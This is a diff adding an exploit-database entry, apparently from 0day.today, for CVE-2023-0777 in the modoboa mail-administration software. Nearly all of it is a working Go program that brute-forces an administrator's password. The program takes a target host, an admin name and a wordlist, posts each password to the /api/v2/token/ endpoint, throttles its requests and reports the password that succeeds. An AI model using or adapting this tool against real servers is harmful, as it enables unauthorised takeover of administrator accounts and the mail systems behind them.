@@ -1,0 +1,107 @@
+id: 38510
+date: 04/06/2023
+title: modoboa 2.0.4 - Admin Account Takeover Exploit
+author: 7h3h4ckv157
+cves: CVE-2023-0777
+
+/* # Exploit Title: modoboa  2.0.4 - Admin TakeOver 
+# Description: Authentication Bypass by Primary Weakness 
+# Software Link: https://github.com/modoboa/modoboa
+# Version: modoboa/modoboa prior to 2.0.4
+# Tested on: Arch Linux 
+# Exploit Author: 7h3h4ckv157
+# CVE: CVE-2023-0777 
+
+
+*/
+
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+)
+
+func main() {
+	fmt.Println("\n\t*** ADMIN TAKEOVER ***\n")
+	host := getInput("Enter the target host: ")
+	username := getInput("Enter the Admin's Name: ")
+	passwordFile := getInput("Provide the path for Password-Wordlist: ")
+
+
+	passwords, err := readLines(passwordFile)
+	if err != nil {
+		fmt.Println("Error reading password file:", err)
+		os.Exit(1)
+	}
+
+	for _, password := range passwords {
+		data := fmt.Sprintf("-----------------------------25524418606542250161357131552\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n%s\r\n-----------------------------25524418606542250161357131552\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n%s\r\n-----------------------------25524418606542250161357131552--\r\n\r\n", username, password)
+
+		headers := map[string]string{
+			"Host":           host,
+			"User-Agent":     "Anonymous",
+			"Accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"Accept-Language": "en-US,en;q=0.5",
+			"Accept-Encoding": "gzip, deflate",
+			"Content-Type":   "multipart/form-data; boundary=---------------------------25524418606542250161357131552",
+		}
+
+		resp, err := postRequest(fmt.Sprintf("https://%s/api/v2/token/", host), headers, data)
+		if err != nil {
+			fmt.Println("Error sending request:", err)
+			os.Exit(1)
+		}
+
+		if resp.StatusCode == 200 {
+			fmt.Printf("\n\tValid password Found: %s\n", password)
+			break
+		} else {
+			fmt.Printf("Invalid password: %s\n", password)
+		}
+
+		// Delay the next request to limit the requests per second
+		delay := time.Duration(1000000000/50) * time.Nanosecond
+		time.Sleep(delay)
+	}
+}
+
+// Read the lines from a file and return them as a slice of strings
+func readLines(filename string) ([]string, error) {
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+	return strings.Split(string(content), "\n"), nil
+}
+
+// Send a POST request with the given headers and data
+func postRequest(url string, headers map[string]string, data string) (*http.Response, error) {
+	req, err := http.NewRequest("POST", url, strings.NewReader(data))
+	if err != nil {
+		return nil, err
+	}
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
+
+// Get user input and return the trimmed value
+func getInput(prompt string) string {
+	fmt.Print(prompt)
+	var input string
+	fmt.Scanln(&input)
+	return strings.TrimSpace(input)
+}
+
+#  0day.today [2023-04-19]  #
